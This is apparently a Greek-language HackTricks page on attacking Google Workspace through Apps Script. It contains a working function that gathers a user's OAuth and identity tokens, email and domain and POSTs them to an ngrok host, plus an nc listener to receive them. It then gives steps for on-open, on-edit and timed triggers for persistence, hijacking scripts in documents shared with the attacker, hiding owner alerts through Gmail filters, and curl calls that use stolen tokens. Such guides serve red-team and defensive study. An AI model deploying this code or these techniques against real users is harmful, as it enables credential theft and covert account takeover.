# GWS - Σενάρια App Scripts

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Σενάρια App Scripts

Τα App Scripts είναι **κώδικας που θα εκτελείται όταν ένας χρήστης με δικαιώματα επεξεργαστή έχει πρόσβαση στο έγγραφο με το οποίο συνδέεται το App Script** και μετά την **αποδοχή της OAuth προτροπής**.\
Μπορούν επίσης να οριστούν να εκτελούνται **κάθε συγκεκριμένο χρονικό διάστημα** από τον ιδιοκτήτη του App Script (Μόνιμη).

### Δημιουργία App Script

Υπάρχουν διάφοροι τρόποι για να δημιουργήσετε ένα App Script, αν και οι πιο κοινοί είναι από ένα **έγγραφο Google (οποιουδήποτε τύπου)** και ως ένα **αυτόνομο έργο**:

<details>

<summary>Δημιουργία έργου που συνδέεται με το Google Docs, Sheets ή Slides</summary>

1. Ανοίξτε ένα έγγραφο Docs, ένα φύλλο Sheets ή μια παρουσίαση Slides.
2. Κάντε κλικ στο **Επεκτάσεις** > **Google Apps Script**.
3. Στον επεξεργαστή κώδικα, κάντε κλικ στο **Ανώνυμο έργο**.
4. Δώστε στο έργο σας ένα όνομα και κάντε κλικ στο **Μετονομασία**.

</details>

<details>

<summary>Δημιουργία αυτόνομου έργου</summary>

Για να δημιουργήσετε ένα αυτόνομο έργο από το Apps Script:

1. Πηγαίνετε στην ιστοσελίδα [`script.google.com`](https://script.google.com/).
2. Κάντε κλικ στο **Προσθήκη νέου έργου**.
3. Στον επεξεργαστή κώδικα, κάντε κλικ στο **Ανώνυμο έργο**.
4. Δώστε στο έργο σας ένα όνομα και κάντε κλικ στο **Μετονομασία**.

</details>

<details>

<summary>Δημιουργία αυτόνομου έργου από το Google Drive</summary>

1. Ανοίξτε το [Google Drive](https://drive.google.com/).
2. Κάντε κλικ στο **Νέο** > **Περισσότερα** > **Google Apps Script**.

</details>

<details>

<summary>Δημιουργία έργου που συνδέεται με το Google Forms</summary>

1. Ανοίξτε ένα φόρμα στο Google Forms.
2. Κάντε κλικ στο Περισσότερα more\_vert > **Επεξεργαστής σεναρίου**.
3. Στον επεξεργαστή κώδικα, κάντε κλικ στο **Ανώνυμο έργο**.
4. Δώστε στο έργο σας ένα όνομα και κάντε κλικ στο **Μετονομασία**.

</details>

<details>

<summary>Δημιουργία αυτόνομου έργου χρησιμοποιώντας το εργαλείο γραμμής εντολών clasp</summary>

Το `clasp` είναι ένα εργαλείο γραμμής εντολών που σας επιτρέπει να δημιουργείτε, να τραβάτε/σπρώχνετε και να αναπτύσσετε έργα Apps Script από ένα τερματικό.

Δείτε τον [οδηγό για το Command Line Interface χρησιμοποιώντας το `clasp`](https://developers.google.com/apps-script/guides/clasp) για περισσότερες λεπτομέρειες.

</details>

## Σενάριο App Script <a href="#create-using-clasp" id="create-using-clasp"></a>

### Δημιουργία Google Sheet με App Script

Ξεκινήστε δημιουργώντας ένα App Script, η σύστασή μου για αυτό το σενάριο είναι να δημιουργήσετε ένα Google Sheet και να πάτε στο **`Επεκτάσεις > App Scripts`**, αυτό θα ανοίξει ένα **νέο App Script συνδεδεμένο με το φύλλο**.

### Διαρροή διαπιστευτηρίων

Για να δώσετε πρόσβαση στο διαπιστευτήριο OAuth, πρέπει να κάνετε κλικ στο **`Υπηρεσίες +` και να προσθέσετε εύρος όπως**:

* **AdminDirectory**: Πρόσβαση σε χρήστες και ομάδες του καταλόγου (εάν ο χρήστης έχει αρκετές άδειες)
* **Gmail**: Πρόσβαση σε δεδομένα gmail
* **Drive**: Πρόσβαση σε δεδομένα drive
* **Google Sheets API**: Έτσι λειτουργεί με την ενεργοποίηση

Για να αλλάξετε εσείς οι ίδιοι τα **απαιτούμενα εύρη** μπορείτε να πάτε στις ρυθμίσεις του έργου και να **ενεργοποιήσετε την εμφάνιση του αρχείου μεταδεδομένων "appsscript.json" στον επεξεργαστή**.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Για να καταγράψετε το αίτημα, απλά μπορείτε να το εκτελέσετε:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Δικαιώματα που ζητούνται για την εκτέλεση του App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Καθώς γίνεται μια εξωτερική αίτηση, η προτροπή OAuth θα ζητήσει επίσης **άδεια για την πρόσβαση σε εξωτερικά σημεία**.
{% endhint %}

### Δημιουργία Trigger

Αφού διαβάσετε το App, κάντε κλικ στο **⏰ Triggers** για να δημιουργήσετε ένα trigger. Ως **λειτουργία** επιλέξτε **`getToken`**, εκτελείται κατά την αναπτυξιακή **`Head`**, στην πηγή γεγονότος επιλέξτε **`Από υπολογιστικό φύλλο`** και τύπο γεγονότος επιλέξτε **`Στο άνοιγμα`** ή **`Στην επεξεργασία`** (ανάλογα με τις ανάγκες σας) και αποθηκεύστε.

Σημειώστε ότι μπορείτε να ελέγξετε τις **εκτελέσεις του App Scripts στην καρτέλα Εκτελέσεις** αν θέλετε να εντοπίσετε κάποιο σφάλμα.

### Κοινή χρήση

Για να **ενεργοποιηθεί** το **App Script**, ο θύμα πρέπει να συνδεθεί με **Πρόσβαση επεξεργαστή**.

Συνοψίζοντας, αν ο δημιουργός και ο προσκεκλημένος χρήστης είναι **από την ίδια οργάνωση**, το **OAuth token** θα **ανήκει** στον **χρήστη** που έχει πρόσβαση στο αρχείο.\
Αν ανήκουν σε **διαφορετικές οργανώσεις**, το **token** θα ανήκει στον **δημιουργό του trigger** πάντα με **μόνο τα δικαιώματα OAuth που δόθηκαν** κατά τη δημιουργία του trigger.

{% hint style="success" %}
Το **token** που χρησιμοποιείται για την εκτέλεση του **App Script** θα είναι αυτό του **δημιουργού του trigger**, ακόμα κι αν το αρχείο ανοίγεται ως Επεξεργαστής από άλλους χρήστες.
{% endhint %}

### Κατάχρηση εγγράφων που κοινοποιήθηκαν με εμένα

{% hint style="danger" %}
Αν κάποιος **κοινοποίησε μαζί σας ένα έγγραφο με App Scripts και ένα trigger χρησιμοποιώντας το Head** του App Script (όχι μια σταθερή ανάπτυξη), μπορείτε να τροποποιήσετε τον κώδικα του App Script (προσθέτοντας, για παράδειγμα, λειτουργίες κλοπής token), να έχετε πρόσβαση σε αυτό και το **App Script θα εκτελεστεί με τα δικαιώματα του χρήστη που κοινοποίησε το έγγραφο μαζί σας**! (σημειώστε ότι το OAuth token του κατόχου θα έχει ως πεδία πρόσβασης αυτά που δόθηκαν κατά τη δημιουργία του trigger).

Θα αποσταλεί μια **ειδοποίηση στον δημιουργό του σεναρίου που υποδεικνύει ότι κάποιος τροποποίησε το σενάριο** (Τι λέτε για τη χρήση δικαιωμάτων gmail για τη δημιουργία φίλτρου προκειμένου να αποτραπεί η ειδοποίηση;)
{% endhint %}

{% hint style="success" %}
Αν ένας **επιτιθέμενος τροποποιήσει τις εμβέλειες του App Script**, οι ενημερώσεις **δεν θα εφαρμοστούν** στο έγγραφο μέχρι να δημιουργηθεί ένας **νέος trigger** με τις αλλαγές. Επομένως, ένας επιτιθέμενος δεν θα μπορεί να κλέψει το token του κατόχου με περισσότερες εμβέλειες από αυτές που ορίστηκαν στο trigger που δημιούργησε.
{% endhint %}

### Αντιγραφή αντί για κοινή χρήση

Όταν δημιουργείτε ένα σύνδεσμο για να κοινοποιήσετε ένα έγγραφο, δημιουργείται ένας σύνδεσμος παρόμοιος με αυτόν: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Αν **αλλάξετε** το τελευταίο **"/edit"** σε **"/copy"**, αντί να αποκτήσετε πρόσβαση, η Google θα σας ρωτήσει αν θέλετε να **δημιουργήσετε αντίγραφο του εγγράφου:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Αν ο χρήστης το αντιγράψει και το ανοίξει, τότε **τόσο τα περιεχόμενα του εγγράφου όσο και τα App Scripts θα αντιγραφούν**, αλλά τα **trigger δεν θα αντιγραφούν**, επομένως **τίποτα δεν θα εκτελεστεί**.

### Κοινή χρήση ως Ιστοεφαρμογή

Σημειώστε ότι είναι επίσης δυνατόν να **κοινοποιήσετε ένα App Script ως Ιστοεφαρμογή** (στον Επεξεργαστή του App Script, αναπτύξτε ως Ιστοεφαρμογή), αλλά θα εμφανιστεί μια προειδοποίηση όπως αυτή:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Ακολουθείται από την **κλασική προτροπή OAuth** που ζητά τα απαιτούμενα δικαιώματα.

### Δοκιμή

Μπορείτε να δοκιμάσετε ένα συλλεγμένο token για να καταγράψετε τα email με:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Λίστα ημερολογίου του χρήστη:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Σενάριο App Script ως Μόνιμη Παραμονή

Μία επιλογή για μόνιμη παραμονή θα ήταν να **δημιουργηθεί ένα έγγραφο και να προστεθεί ένας trigger για τη συνάρτηση getToken** και να μοιραστεί το έγγραφο με τον επιτιθέμενο, έτσι ώστε κάθε φορά που ο επιτιθέμενος ανοίγει το αρχείο, **εξαγάγει το token του θύματος**.

Είναι επίσης δυνατόν να δημιουργηθεί ένα App Script και να το ρυθμίσετε να εκτελείται κάθε X χρόνο (π.χ. κάθε λεπτό, ώρα, ημέρα...). Ένας επιτιθέμενος που έχει **κατακτήσει διαπιστευτήρια ή μια συνεδρία ενός θύματος μπορεί να ρυθμίσει ένα App Script trigger χρόνου και να διαρρεύσει ένα πολύ προνομιούχο OAuth token κάθε μέρα**:

Απλά δημιουργήστε ένα App Script, πηγαίνετε στους Συναγερμούς, κάντε κλικ στο Προσθήκη Συναγερμού και επιλέξτε ως πηγή γεγονότος τον Χρονοκαθορισμένο χρόνο και επιλέξτε τις επιλογές που σας ταιριάζουν καλύτερα:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Αυτό θα δημιουργήσει ένα email ασφαλείας και ένα μήνυμα push στο κινητό σας που θα σας ειδοποιεί για αυτό.
{% endhint %}



### Παράκαμψη Μη Επαληθευμένης Προτροπής Κοινόχρηστου Εγγράφου

Επιπλέον, αν κάποιος **μοιραστεί** μαζί σας ένα έγγραφο με **δικαιώματα επεξεργασίας**, μπορείτε να δημιουργήσετε **App Scripts μέσα στο έγγραφο** και ο **ΚΑΤΟΧΟΣ (δημιουργός) του εγγράφου θα είναι ο ιδιοκτήτης του App Script**.

{% hint style="warning" %}
Αυτό σημαίνει ότι ο **δημιουργός του εγγράφου θα εμφανίζεται ως δημιουργός οποιουδήποτε App Script** που δημιουργεί οποιοσδήποτε με δικαιώματα επεξεργασίας μέσα σε αυτό.

Αυτό σημαίνει επίσης ότι το **App Script θα έχει εμπιστοσύνη από το περιβάλλον Workspace** του δημιουργού του εγγράφου.
{% endhint %}

{% hint style="danger" %}
Αυτό σημαίνει επίσης ότι αν ένα **App Script υπήρχε ήδη** και οι άνθρωποι έχουν **χορηγήσει πρόσβαση**, οποιοσδήποτε με δικαιώματα **Επεξεργαστή** στο έγγραφο μπορεί να το **τροποποιήσει και να καταχραστεί αυτήν την πρόσβαση**.\
Για να καταχραστείτε αυτό, χρειάζεστε επίσης ανθρώπους που θα ενεργοποιήσουν το App Script. Και ένα ωραίο κόλπο είναι να **δημοσιεύσετε το script ως web app**. Όταν οι άνθρωποι που έχουν ήδη χορηγήσει πρόσβαση στο App Script αποκτήσουν πρόσβαση στην ιστοσελίδα, θα **ενεργοποιήσουν το App Script** (αυτό λειτουργεί επίσης χρησιμοποιώντας ετικέτες `<img>`).
{% endhint %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
